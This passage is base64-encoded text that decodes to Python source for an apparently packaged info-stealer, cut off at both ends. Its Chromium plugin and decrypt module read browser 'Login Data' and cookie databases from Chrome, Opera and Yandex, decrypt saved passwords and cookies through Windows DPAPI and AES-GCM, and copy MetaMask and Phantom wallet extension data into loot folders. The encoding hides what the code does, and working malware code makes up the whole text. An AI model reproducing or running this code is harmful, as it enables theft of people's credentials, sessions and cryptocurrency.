ZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMVx4OGYsIHtlfScpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtwfSwgXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcblxyXG4gICAgICAgICAgICBpZiByb3dzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIHBhc3N3b3Jkc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdwYXNzd29yZHMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4ocGFzc3dvcmRzX3BhdGgsIG5hbWUpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHBhc3N3b3Jkc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2RpcihwYXNzd29yZHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIHVybCwgbG9naW4sIHBhc3N3b3JkIGluIHJvd3M6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZidVUkw6IHt1cmx9XFxuTG9naW46IHtsb2dpbn1cXG5QYXNzd29yZDoge3Bhc3N3b3JkfVxcblxcbicpXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX3Bhc3N3b3JkOiB7ZX0nKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9jb29raWVzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGNvb2tpZXMgPSAnJ1xyXG5cclxuICAgICAgICAgICAgY29va2llX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbmV0d29yaycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMoY29va2llX2ZvbGRlcl9wYXRocywgeydDb29raWVzJywgJ2Nvb2tpZXMuc3FsaXRlJ30pOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidDb29raWVzIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBjb29raWVzJ1xyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udiA9IGxhbWJkYSB4OiAnVFJVRScgaWYgeCBlbHNlICdGQUxTRSdcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJvd1sxXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBfb25seSA9IGNvbnYocm93WzldKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSByb3dbNl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmUgPSBjb252KHJvd1s4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmF0aW9uX2RhdGUgPSBzdHIocm93WzddKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSByb3dbM11cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGIwLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdmFsdWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAnJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9ICdcXHQnLmpvaW4oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGhvc3QsIGh0dHBfb25seSwgcGF0aCwgc2VjdXJlLCBleHBpcmF0aW9uX2RhdGUsIG5hbWUsIHZhbHVlKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgKz0gY29va2llICsgJ1xcbidcclxuXHJcbiAgICAgICAgICAgIGlmIGNvb2tpZXM6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgY29va2llc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdjb29raWVzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKGNvb2tpZXNfcGF0aCwgbmFtZSlcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGNvb2tpZXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIoY29va2llc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGNvb2tpZXMpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfY29va2llczoge2V9JylcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3dhbGxldHMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICB3YWxsZXRzID0ge1xyXG4gICAgICAgICAgICAgICAgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJzogJ21ldGFtYXNrJyxcclxuICAgICAgICAgICAgICAgICdiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSc6ICdwaGFudG9tJ1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMod2FsbGV0X2ZvbGRlcl9wYXRocywgc2V0KHdhbGxldHMua2V5cygpKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBuYW1lID0gc3BsaXQocClbMV1cclxuICAgICAgICAgICAgICAgIHdhbGxldF9uYW1lID0gd2FsbGV0c1tuYW1lXVxyXG4gICAgICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGYne3dhbGxldF9uYW1lfV97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHAsIGRlc3RfcGF0aClcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDFceDhjIFx4ZDFceDgxIHtwfScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmEge3Jvb3RfcGF0aH0nKVxyXG4gICAgXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBjaHJvbWl1bV9icm93c2VyX25hbWVzID0ge1xyXG4gICAgICAgICAgICAnb3BlcmEgZ3ggc3RhYmxlJyxcclxuICAgICAgICAgICAgJ29wZXJhIHN0YWJsZScsXHJcbiAgICAgICAgICAgICdjaHJvbWUnLFxyXG4gICAgICAgICAgICAneWFuZGV4YnJvd3NlcidcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRhc2tzOiBMaXN0W1Rhc2tdID0gW11cclxuXHJcbiAgICAgICAgZm9yIGZvbGRlcl9uYW1lIGluIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIocGF0aCkpOlxyXG4gICAgICAgICAgICByb290X3BhdGggPSBqb2luKHBhdGgsIGZvbGRlcl9uYW1lKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9wYXNzd29yZChyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfY29va2llcyhyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfd2FsbGV0cyhyb290X3BhdGgpKSlcclxuXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgc2VsZi5jb25mLmxvZ2dlcikpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gY2hyb21pdW0gdGFza3M6IHtlfScpXHJcbiAgICAgICAgICAgICAgICAiKSNsaW5lOjYzCiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy9icm93c2Vycy9kZWNyeXB0LnB5JyxiJyMgaHR0cHM6Ly9naXRodWIuY29tL2hha2Fub255bW9zL3N0ZWFsLWNocm9tZS1wYXNzd29yZC1hbGwtdmVyc2lvbi9ibG9iL21hc3Rlci9sb2NhbC5weVxyXG5cclxuXHJcbmltcG9ydCBjdHlwZXNcclxuaW1wb3J0IGN0eXBlcy53aW50eXBlc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMgaW1wb3J0IGRlZmF1bHRfYmFja2VuZFxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzIGltcG9ydCAoXHJcbiAgICBDaXBoZXIsIGFsZ29yaXRobXMsIG1vZGVzKVxyXG5pbXBvcnQgYmFzZTY0XHJcbmltcG9ydCBvc1xyXG5pbXBvcnQganNvblxyXG5cclxuXHJcbmNsYXNzIERlY3J5cHRvcjpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwYXRoKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHBhdGggaXMgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bXCdMT0NBTEFQUERBVEFcJ10sIHIiR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcTG9jYWwgU3RhdGUiKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYucGF0aCA9IHBhdGhcclxuICAgICAgICBcclxuICAgICAgICBzZWxmLmtleSA9IE5vbmVcclxuICAgICAgICBzZWxmLmNpcGhlciA9IE5vbmVcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZHBhcGlfZGVjcnlwdChlbmNyeXB0ZWQpOlxyXG4gICAgICAgIGNsYXNzIERBVEFfQkxPQihjdHlwZXMuU3RydWN0dXJlKTpcclxuICAgICAgICAgICAgX2ZpZWxkc18gPSBbKFwnY2JEYXRhXCcsIGN0eXBlcy53aW50eXBlcy5EV09SRCksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIChcJ3BiRGF0YVwnLCBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY19jaGFyKSldXHJcblxyXG4gICAgICAgIHAgPSBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoZW5jcnlwdGVkLCBsZW4oZW5jcnlwdGVkKSlcclxuICAgICAgICBibG9iaW4gPSBEQVRBX0JMT0IoY3R5cGVzLnNpemVvZihwKSwgcClcclxuICAgICAgICBibG9ib3V0ID0gREFUQV9CTE9CKClcclxuICAgICAgICByZXR2YWwgPSBjdHlwZXMud2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKFxyXG4gICAgICAgICAgICBjdHlwZXMuYnlyZWYoYmxvYmluKSwgTm9uZSwgTm9uZSwgTm9uZSwgTm9uZSwgMCwgY3R5cGVzLmJ5cmVmKGJsb2JvdXQpKVxyXG4gICAgICAgIGlmIG5vdCByZXR2YWw6XHJcbiAgICAgICAgICAgIHJhaXNlIGN0eXBlcy5XaW5FcnJvcigpXHJcbiAgICAgICAgcmVzdWx0ID0gY3R5cGVzLnN0cmluZ19hdChibG9ib3V0LnBiRGF0YSwgYmxvYm91dC5jYkRhdGEpXHJcbiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUoYmxvYm91dC5wYkRhdGEpXHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBkZWNyeXB0KGNpcGhlciwgY2lwaGVydGV4dCwgbm9uY2UpOlxyXG4gICAgICAgIGNpcGhlci5tb2RlID0gbW9kZXMuR0NNKG5vbmNlKVxyXG4gICAgICAgIGRlY3J5cHRvciA9IGNpcGhlci5kZWNyeXB0b3IoKVxyXG4gICAgICAgIHJldHVybiBkZWNyeXB0b3IudXBkYXRlKGNpcGhlcnRleHQpXHJcblxyXG4gICAgZGVmIGdldF9rZXlfZnJvbV9sb2NhbF9zdGF0ZShzZWxmKTpcclxuICAgICAgICBqc24gPSBOb25lXHJcbiAgICAgICAgd2l0aCBvcGVuKHNlbGYucGF0aCwgXCdyXCcpIGFzIGY6XHJcbiAgICAgICAgICAgIGpzbiA9IGpzb24ubG9hZHMoc3RyKGYucmVhZGxpbmUoKSkpXHJcbiAgICAgICAgcmV0dXJuIGpzbltcJ29zX2NyeXB0XCddW1wnZW5jcnlwdGVkX2tleVwnXVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfY2lwaGVyKGtleSk6XHJcbiAgICAgICAgY2lwaGVyID0gQ2lwaGVyKFxyXG4gICAgICAgICAgICBhbGdvcml0aG1zLkFFUyhrZXkpLFxyXG4gICAgICAgICAgICBOb25lLFxyXG4gICAgICAgICAgICBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBjaXBoZXJcclxuXHJcbiAgICBkZWYgYWVzX2RlY3J5cHQoc2VsZiwgZW5jcnlwdGVkX3R4dCk6XHJcbiAgICAgICAgaWYgc2VsZi5rZXkgaXMgTm9uZTpcclxuICAgICAgICAgICAgZW5jb2RlZF9rZXkgPSBzZWxmLmdldF9rZXlfZnJvbV9sb2NhbF9zdGF0ZSgpXHJcbiAgICAgICAgICAgIGVuY3J5cHRlZF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5LmVuY29kZSgpKVxyXG4gICAgICAgICAgICBlbmNyeXB0ZWRfa2V5ID0gZW5jcnlwdGVkX2tleVs1Ol1cclxuICAgICAgICAgICAgc2VsZi5rZXkgPSBEZWNyeXB0b3IuZHBhcGlfZGVjcnlwdChlbmNyeXB0ZWRfa2V5KVxyXG4gICAgICAgICAgICBzZWxmLmNpcGhlciA9IERlY3J5cHRvci5nZXRfY2lwaGVyKHNlbGYua2V5KVxyXG4gICAgICAgIFxyXG4gICAgICAgIG5vbmNlID0gZW5jcnlwdGVkX3R4dFszOjE1XVxyXG5cclxuICAgICAgICByZXR1cm4gRGVjcnlwdG9yLmRlY3J5cHQoc2VsZi5jaXBoZXIsZW5jcnlwdGVkX3R4dFsxNTpdLG5vbmNlKVxyXG5cclxuICAgIGRlZiBkZWNyeXB0X3Bhc3N3b3JkKHNlbGYsIGRhdGEpOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgZGF0YVs6NF0gPT0gYlwnXFx4MDFcXHgwMFxceDAwXFx4MDBcJzpcclxuICAgICAgICAgICAgICAgIGRlY3J5cHRlZCA9IERlY3J5cHRvci5kcGFwaV9kZWNyeXB0KGRhdGEpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkLmRlY29kZSgpXHJcbiAgICAgICAgICAgIGVsaWYgZGF0YVs6M10gPT0gYlwndjEwXCc6XHJcbiAgICAgICAgICAgICAgICBkZWNyeXB0ZWQgPSBzZWxmLmFlc19kZWNyeXB0KGRhdGEpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkWzotMTZdLmRlY29kZSgpXHJcbiAgICAgICAgZXhjZXB0OlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZScpI2xpbmU6NjQKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwbHVnaW5zL2Jyb3dzZXJzL0Nocm9taXVtLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgVGFzaywgY3JlYXRlX3Rhc2tcclxuZnJvbSB0eXBpbmcgaW1wb3J0IExpc3RcclxuZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBta2RpclxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyLCBpc2ZpbGUsIHNwbGl0XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGF0aHNcclxuaW1wb3J0IGFpb3NxbGl0ZVxyXG5mcm9tIC5kZWNyeXB0IGltcG9ydCBEZWNyeXB0b3JcclxuZnJvbSB0aW1lIGltcG9ydCB0aW1lXHJcbmZyb20gcGF0aHMgaW1wb3J0IFRFTVBcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5cclxuXHJcblxyXG5jbGFzcyBDaHJvbWl1bShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBOb25lXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXRfZGVjcnlwdG9yKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvY2FsX3N0YXRlX2ZvbGRlcnMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbG9jYWxfc3RhdGVzID0gW11cclxuICAgICAgICBhc3luYyBmb3IgaSBpbiBzZWFyY2hfcGF0aHMobG9jYWxfc3RhdGVfZm9sZGVycywgeydMb2NhbCBTdGF0ZSd9KTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVzLmFwcGVuZChpKVxyXG5cclxuICAgICAgICBpZiBsb2NhbF9zdGF0ZXM6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBsb2NhbF9zdGF0ZXNbMF1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IERlY3J5cHRvcihsb2NhbF9zdGF0ZV9wYXRoKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfcGFzc3dvcmQoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByb3dzID0gW11cclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBsb2dpbl9kYXRhX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMobG9naW5fZGF0YV9mb2xkZXJfcGF0aHMsIHsnTG9naW4gRGF0YSd9KTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidMb2dpbiBEYXRhIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3N